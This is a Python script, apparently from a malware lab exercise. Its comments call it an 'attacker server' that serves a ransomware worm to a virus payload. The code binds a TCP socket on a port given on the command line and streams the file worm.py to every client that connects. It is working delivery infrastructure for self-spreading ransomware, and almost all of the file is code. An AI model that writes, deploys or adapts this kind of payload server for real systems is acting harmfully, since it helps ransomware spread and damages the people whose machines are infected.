#!/usr/bin/python3
# Run “./attacker_server <Attacker port>” to set up the attacker server
# The attacker server shall
# - Listen on the attacker port
# - Serve the ransomware worm to the virus payload

import socket
import sys

def main():
    # with open('ransomware.py', 'rb') as f:
    #     data = f.read()

    host = '0.0.0.0'
    attacker_port = int(sys.argv[1])
    attacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    attacker_server.bind((host, attacker_port))
    attacker_server.listen(5)
    print("Attacker server listening on port {}".format(attacker_port))
    
    while True:
        conn, addr = attacker_server.accept()
        # print("Connected to {}".format(addr))
        # while True:
        #     break
        with conn:
            print("Connected by", addr)
            worm = open('worm.py', 'rb')
            data = worm.read()
            while data:
                conn.send(data)
                data = worm.read()

            worm.close()
            conn.close()



if __name__ == '__main__':
    main()
